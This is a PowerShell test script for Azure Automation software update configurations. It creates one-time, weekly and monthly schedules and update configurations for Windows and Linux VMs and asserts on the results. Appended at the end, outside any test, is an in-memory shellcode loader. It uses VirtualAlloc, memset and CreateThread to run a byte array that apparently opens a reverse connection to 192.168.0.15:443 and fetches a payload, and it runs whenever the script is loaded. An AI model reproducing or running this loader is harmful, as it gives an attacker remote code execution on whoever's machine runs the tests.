$rg = "mo-resources-eus"
$aa = "mo-aaa-eus2"
$azureVMIdsW = @(
        "/subscriptions/422b6c61-95b0-4213-b3be-7282315df71d/resourceGroups/mo-compute/providers/Microsoft.Compute/virtualMachines/mo-vm-w-01",
        "/subscriptions/422b6c61-95b0-4213-b3be-7282315df71d/resourceGroups/mo-compute/providers/Microsoft.Compute/virtualMachines/mo-vm-w-02"
    )

$azureVMIdsL = @(
        "/subscriptions/422b6c61-95b0-4213-b3be-7282315df71d/resourceGroups/mo-compute/providers/Microsoft.Compute/virtualMachines/mo-vm-l-01",
        "/subscriptions/422b6c61-95b0-4213-b3be-7282315df71d/resourceGroups/mo-compute/providers/Microsoft.Compute/virtualMachines/mo-vm-l-02"
    )

$nonAzurecomputers = @("server-01", "server-02")


function WaitForProvisioningState() {
    param([string] $Name, [string] $ExpectedState)

    $waitTimeInSeconds = 2
    $retries = 40

    $jobCompleted = Retry-Function {
        return (Get-AzAutomationSoftwareUpdateConfiguration -ResourceGroupName $rg `
                                                                 -AutomationAccountName $aa `
                                                                 -Name $Name).ProvisioningState -eq $ExpectedState } $null $retries $waitTimeInSeconds

    Assert-True {$jobCompleted -gt 0} "Timout waiting for provisioning state to reach '$ExpectedState'"
}


function Test-CreateWindowsOneTimeSoftwareUpdateConfigurationWithDefaults {
    $name = "mo-onetime-01"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Windows `
                                                             -AzureVMResourceId $azureVMIdsW `
                                                             -Duration (New-TimeSpan -Hours 2)`
                                                             -IncludedUpdateClassification Critical

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"

    WaitForProvisioningState $name "Succeeded"
}


function Test-CreateLinuxOneTimeSoftwareUpdateConfigurationWithDefaults {
    $name = "mo-onetime-02"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -AzureVMResourceId $azureVMIdsL `
                                                             -Duration (New-TimeSpan -Hours 2)`
                                                             -IncludedPackageClassification Security,Critical

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"

    WaitForProvisioningState $name "Succeeded"
}


function Test-CreateWindowsOneTimeSoftwareUpdateConfigurationWithAllOption {
    $name = "mo-onetime-03"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Windows `
                                                             -AzureVMResourceId $azureVMIdsW `
                                                             -NonAzureComputer $nonAzurecomputers `
                                                             -Duration (New-TimeSpan -Hours 2) `
                                                             -IncludedUpdateClassification Security,UpdateRollup `
                                                             -ExcludedKbNumber KB01,KB02 `
                                                             -IncludedKbNumber KB100

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"

    WaitForProvisioningState $name "Failed"
}


function Test-CreateLinuxOneTimeSoftwareUpdateConfigurationWithAllOption {
    $name = "mo-onetime-04"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -AzureVMResourceId $azureVMIdsL `
                                                             -NonAzureComputer $nonAzurecomputers `
                                                             -Duration (New-TimeSpan -Hours 2) `
                                                             -IncludedPackageClassification Security,Critical `
                                                             -ExcludedPackageNameMask Mask01,Mask02 `
                                                             -IncludedPackageNameMask Mask100

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"

    WaitForProvisioningState $name "Failed"
}


function Test-CreateLinuxOneTimeSoftwareUpdateConfigurationNonAzureOnly {
    $name = "mo-onetime-05"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -NonAzureComputer $nonAzurecomputers `
                                                             -Duration (New-TimeSpan -Hours 2) `
                                                             -IncludedPackageClassification Security,Critical `
                                                             -ExcludedPackageNameMask Mask01,Mask02 `
                                                             -IncludedPackageNameMask Mask100

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"

    WaitForProvisioningState $name "Failed"
}


function Test-CreateLinuxOneTimeSoftwareUpdateConfigurationNoTargets {
    $name = "mo-onetime-05"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    Assert-Throws {
        $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -Duration (New-TimeSpan -Hours 2) `
                                                             -IncludedPackageClassification Security,Critical `
                                                             -ExcludedPackageNameMask Mask01,Mask02 `
                                                             -IncludedPackageNameMask Mask100 `
                                                             -PassThru -ErrorAction Stop
    }
}



function Test-GetAllSoftwareUpdateConfigurations {
    $sucs = Get-AzAutomationSoftwareUpdateConfiguration -ResourceGroupName $rg `
                                                              -AutomationAccountName $aa
    Assert-AreEqual $sucs.Count 17 "Get all software update configuration didn't retrieve the expected number of items. actual SCU count is $($sucs.Count)"
}



function Test-GetSoftwareUpdateConfigurationsForVM {
    $sucs = Get-AzAutomationSoftwareUpdateConfiguration -ResourceGroupName $rg `
                                                              -AutomationAccountName $aa `
                                                              -AzureVMResourceId $azureVMIdsW[0]
    Assert-AreEqual $sucs.Count 7 "Get software update configurations for VM didn't return expected number of items. Actual SUC count per VM is $($sucs.Count)"
}



function Test-DeleteSoftwareUpdateConfiguration {
    $name = "mo-delete-it"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                      -AutomationAccountName $aa `
                                                      -Schedule $s `
                                                      -Windows `
                                                      -AzureVMResourceId $azureVMIdsW `
                                                      -Duration (New-TimeSpan -Hours 2) `
													  -IncludedUpdateClassification Critical
    WaitForProvisioningState $name "Succeeded"
    Remove-AzAutomationSoftwareUpdateConfiguration   -ResourceGroupName $rg `
                                                          -AutomationAccountName $aa `
                                                          -Name $name
    Wait-Seconds 5
	Assert-Throws { 
		Get-AzAutomationSoftwareUpdateConfiguration   -ResourceGroupName $rg `
                                                           -AutomationAccountName $aa `
                                                           -Name $name
	}
}


function Test-GetAllSoftwareUpdateRuns {
    $runs = Get-AzAutomationSoftwareUpdateRun  -ResourceGroupName $rg `
                                                    -AutomationAccountName $aa
    
    Assert-AreEqual $runs.Count 13 "Get software update configurations runs didn't return expected number of items"
}



function Test-GetAllSoftwareUpdateRunsWithFilters {
    $runs = Get-AzAutomationSoftwareUpdateRun  -ResourceGroupName $rg `
                                                    -AutomationAccountName $aa `
                                                    -OperatingSystem Windows `
                                                    -StartTime ([DateTime]::Parse("2018-05-22T16:40:00")) `
                                                    -Status Succeeded

    Assert-AreEqual $runs.Count 2 "Get software update configurations runs with filters didn't return expected number of items"
}


function Test-GetAllSoftwareUpdateRunsWithFiltersNoResults {
    $runs = Get-AzAutomationSoftwareUpdateRun  -ResourceGroupName $rg `
                                                    -AutomationAccountName $aa `
                                                    -OperatingSystem Windows `
                                                    -StartTime ([DateTime]::Parse("2018-05-22T16:40:00.0000000-07:00")) `
                                                    -Status Failed

    Assert-AreEqual $runs.Count 0 "Get software update configurations runs with filters and no results didn't return expected number of items"
}



function Test-GetAllSoftwareUpdateMachineRuns {
    $runs = Get-AzAutomationSoftwareUpdateMachineRun  -ResourceGroupName $rg `
                                                           -AutomationAccountName $aa
    
    Assert-AreEqual $runs.Count 83 "Get software update configurations machine runs didn't return expected number of items $($runs.Count)" 
}


function Test-GetAllSoftwareUpdateMachineRunsWithFilters {
    $runs = Get-AzAutomationSoftwareUpdateMachineRun  -ResourceGroupName $rg `
                                                           -AutomationAccountName $aa `
                                                           -SoftwareUpdateRunId b4ec6c22-92bf-4f8a-b2d9-20d8446e618a `
                                                           -Status Succeeded `
                                                           -TargetComputer $azureVMIdsW[0]

    Assert-AreEqual $runs.Count 1 "Get software update configurations machine runs with filters didn't return expected number of items"
}


function Test-GetAllSoftwareUpdateMachineRunsWithFiltersNoResults {
    $runs = Get-AzAutomationSoftwareUpdateMachineRun  -ResourceGroupName $rg `
                                                           -AutomationAccountName $aa `
                                                           -SoftwareUpdateRunId b4ec6c22-92bf-4f8a-b2d9-20d8446e618a `
                                                           -Status Succeeded `
                                                           -TargetComputer foo

    Assert-AreEqual $runs.Count 0 "Get software update configurations machine runs with filters and no results didn't return expected number of items"
}


function Test-CreateLinuxWeeklySoftwareUpdateConfiguration() {
    $name = "mo-weekly-01"
    $startTime = ([DateTime]::Now).AddMinutes(10)
    $duration = New-TimeSpan -Hours 2
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -WeekInterval 1 `
                                       -DaysOfWeek Friday `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -AzureVMResourceId $azureVMIdsL `
                                                             -Duration $duration `
                                                             -IncludedPackageClassification Other,Security `
                                                             -ExcludedPackageNameMask @("Mask-exc-01", "Mask-exc-02")


    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"
    Assert-NotNull $suc.UpdateConfiguration "UpdateConfiguration of the software update configuration object is null"
    Assert-NotNull $suc.ScheduleConfiguration "ScheduleConfiguration of the software update configuration object is null"
    Assert-AreEqual $suc.ProvisioningState "Provisioning" "software update configuration provisioning state was not expected"
    Assert-AreEqual $suc.UpdateConfiguration.OperatingSystem "Linux" "UpdateConfiguration Operating system is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.Duration $duration "UpdateConfiguration Duration is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.AzureVirtualMachines.Count 2 "UpdateConfiguration created doesn't have the correct number of azure virtual machines"
    Assert-AreEqual $suc.UpdateConfiguration.NonAzureComputers.Count 0 "UpdateConfiguration doesn't have correct value of NonAzureComputers"
    Assert-NotNull $suc.UpdateConfiguration.Linux "Linux property of UpdateConfiguration is null"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.IncludedPackageClassifications.Count 2 "Invalid UpdateConfiguration.Linux.IncludedPackageClassifications.Count"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.IncludedPackageClassifications[0] Security "Invalid value of UpdateConfiguration.Linux.IncludedPackageClassifications[0]"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.IncludedPackageClassifications[1] Other "Invalid value of UpdateConfiguration.Linux.IncludedPackageClassifications[1]"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.ExcludedPackageNameMasks.Count 2
    Assert-AreEqual $suc.UpdateConfiguration.Linux.ExcludedPackageNameMasks[0] "Mask-exc-01"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.ExcludedPackageNameMasks[1] "Mask-exc-02"

    WaitForProvisioningState $name "Succeeded"
}


function Test-CreateWindowsMonthlySoftwareUpdateConfiguration() {
    $name = "mo-monthly-01"
    $startTime = ([DateTime]::Now).AddMinutes(10)
    $duration = New-TimeSpan -Hours 2
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -MonthInterval 1 `
                                       -DaysOfMonth Two,Five `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Windows `
                                                             -AzureVMResourceId $azureVMIdsW `
                                                             -Duration $duration `
                                                             -IncludedUpdateClassification Critical,Security `
                                                             -ExcludedKbNumber @("KB-01", "KB-02")


    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"
    Assert-NotNull $suc.UpdateConfiguration "UpdateConfiguration of the software update configuration object is null"
    Assert-NotNull $suc.ScheduleConfiguration "ScheduleConfiguration of the software update configuration object is null"
    Assert-AreEqual $suc.ProvisioningState "Provisioning" "software update configuration provisioning state was not expected"
    Assert-AreEqual $suc.UpdateConfiguration.OperatingSystem "Windows" "UpdateConfiguration Operating system is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.Duration $duration "UpdateConfiguration Duration is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.AzureVirtualMachines.Count 2 "UpdateConfiguration created doesn't have the correct number of azure virtual machines"
    Assert-AreEqual $suc.UpdateConfiguration.NonAzureComputers.Count 0 "UpdateConfiguration doesn't have correct value of NonAzureComputers"
    Assert-NotNull $suc.UpdateConfiguration.Windows "Linux property of UpdateConfiguration is null"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.IncludedUpdateClassifications.Count 2 "Invalid UpdateConfiguration.Linux.IncludedPackageClassifications.Count"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.IncludedUpdateClassifications[0] Critical "Invalid value of UpdateConfiguration.Linux.IncludedPackageClassifications[0]"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.IncludedUpdateClassifications[1] Security "Invalid value of UpdateConfiguration.Linux.IncludedPackageClassifications[1]"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.ExcludedKbNumbers.Count 2
    Assert-AreEqual $suc.UpdateConfiguration.Windows.ExcludedKbNumbers[0] "KB-01"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.ExcludedKbNumbers[1] "KB-02"

    WaitForProvisioningState $name "Succeeded"
}


function Test-CreateWindowsIncludeKbNumbersSoftwareUpdateConfiguration() {

    $aa = "Automate-d2b38167-d3ca-4d1f-a020-948eee21b6bc-EJP"
	$rg = "DefaultResourceGroup-EJP"
    $azureVMIdsW = @(
	   "/subscriptions/d2b38167-d3ca-4d1f-a020-948eee21b6bc/resourceGroups/ikwjp12r201-RG/providers/Microsoft.Compute/virtualMachines/ikwjp12r201"
	)

    $name = "mo-monthly-01"
    $startTime = ([DateTime]::Now).AddMinutes(10)
    $duration = New-TimeSpan -Hours 2
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -MonthInterval 1 `
                                       -DaysOfMonth Two,Five `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Windows `
                                                             -AzureVMResourceId $azureVMIdsW `
                                                             -Duration $duration `
                                                             -IncludedKbNumber @("2952664", "2990214")

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"
    Assert-NotNull $suc.UpdateConfiguration "UpdateConfiguration of the software update configuration object is null"
    Assert-NotNull $suc.ScheduleConfiguration "ScheduleConfiguration of the software update configuration object is null"
    Assert-AreEqual $suc.ProvisioningState "Provisioning" "software update configuration provisioning state was not expected"
    Assert-AreEqual $suc.UpdateConfiguration.OperatingSystem "Windows" "UpdateConfiguration Operating system is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.Duration $duration "UpdateConfiguration Duration is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.AzureVirtualMachines.Count 1 "UpdateConfiguration created doesn't have the correct number of azure virtual machines"
    Assert-AreEqual $suc.UpdateConfiguration.NonAzureComputers.Count 0 "UpdateConfiguration doesn't have correct value of NonAzureComputers"
    Assert-NotNull $suc.UpdateConfiguration.Windows "Linux property of UpdateConfiguration is null"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.IncludedKbNumbers.Count 2
    Assert-AreEqual $suc.UpdateConfiguration.Windows.IncludedKbNumbers[0] "2952664"
    Assert-AreEqual $suc.UpdateConfiguration.Windows.IncludedKbNumbers[1] "2990214"

    WaitForProvisioningState $name "Succeeded"
}



function Test-CreateLinuxIncludedPackageNameMasksSoftwareUpdateConfiguration() {

    $aa = "Automate-d2b38167-d3ca-4d1f-a020-948eee21b6bc-EJP"
	$rg = "DefaultResourceGroup-EJP"
    $azureVMIdsL = @(
	   "/subscriptions/d2b38167-d3ca-4d1f-a020-948eee21b6bc/resourceGroups/ikanni-rhel74-omi-001-RG/providers/Microsoft.Compute/virtualMachines/ikanni-rhel74-omi-001"
	)

    $name = "mo-monthly-02"
    $startTime = ([DateTime]::Now).AddMinutes(10)
    $duration = New-TimeSpan -Hours 2
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description test-OneTime `
                                       -MonthInterval 1 `
                                       -DaysOfMonth Two,Five `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -AzureVMResourceId $azureVMIdsL `
                                                             -Duration $duration `
                                                             -IncludedPackageNameMask  @("*kernel*", "pyhton*.x64")

    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"
    Assert-NotNull $suc.UpdateConfiguration "UpdateConfiguration of the software update configuration object is null"
    Assert-NotNull $suc.ScheduleConfiguration "ScheduleConfiguration of the software update configuration object is null"
    Assert-AreEqual $suc.ProvisioningState "Provisioning" "software update configuration provisioning state was not expected"
    Assert-AreEqual $suc.UpdateConfiguration.OperatingSystem "Linux" "UpdateConfiguration Operating system is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.Duration $duration "UpdateConfiguration Duration is not expected"
    Assert-AreEqual $suc.UpdateConfiguration.AzureVirtualMachines.Count 1 "UpdateConfiguration created doesn't have the correct number of azure virtual machines"
    Assert-AreEqual $suc.UpdateConfiguration.NonAzureComputers.Count 0 "UpdateConfiguration doesn't have correct value of NonAzureComputers"
    Assert-NotNull $suc.UpdateConfiguration.Linux "Windows property of UpdateConfiguration is null"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.IncludedPackageNameMasks.Count 2
    Assert-AreEqual $suc.UpdateConfiguration.Linux.IncludedPackageNameMasks[0] "*kernel*"
    Assert-AreEqual $suc.UpdateConfiguration.Linux.IncludedPackageNameMasks[1] "pyhton*.x64"

    WaitForProvisioningState $name "Succeeded"
}



function Test-CreateLinuxSoftwareUpdateConfigurationWithRebootSetting {
	$azureVMIdsLinux = @(
        "/subscriptions/d2b38167-d3ca-4d1f-a020-948eee21b6bc/resourceGroups/ikanni-rhel76-hw-001-RG/providers/Microsoft.Compute/virtualMachines/ikanni-rhel76-hw-001",
        "/subscriptions/d2b38167-d3ca-4d1f-a020-948eee21b6bc/resourceGroups/ikanni-rhel76-JPE-hw-002-RG/providers/Microsoft.Compute/virtualMachines/ikanni-rhel76-JPE-hw-002"
    )

    $name = "linx-suc-reboot"
	$rebootSetting = "Never"
    $startTime = ([DateTime]::Now).AddMinutes(10)
	$s = New-AzAutomationSchedule -ResourceGroupName $rg `
                                       -AutomationAccountName $aa `
                                       -Name $name `
                                       -Description linux-suc-reboot `
                                       -OneTime `
                                       -StartTime $startTime `
                                       -ForUpdate

    $suc = New-AzAutomationSoftwareUpdateConfiguration  -ResourceGroupName $rg `
                                                             -AutomationAccountName $aa `
                                                             -Schedule $s `
                                                             -Linux `
                                                             -AzureVMResourceId $azureVMIdsLinux `
                                                             -NonAzureComputer $nonAzurecomputers `
                                                             -Duration (New-TimeSpan -Hours 2) `
                                                             -IncludedPackageClassification Security,Critical `
                                                             -ExcludedPackageNameMask Mask01,Mask02 `
                                                             -IncludedPackageNameMask Mask100 `
															 -RebootSetting $rebootSetting
	
    Assert-NotNull $suc "New-AzAutomationSoftwareUpdateConfiguration returned null"
    Assert-AreEqual $suc.Name $name "Name of created software update configuration didn't match given name"
	Assert-AreEqual $suc.UpdateConfiguration.Linux.rebootSetting $rebootSetting "Reboot setting failed to match"

    WaitForProvisioningState $name "Failed"
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
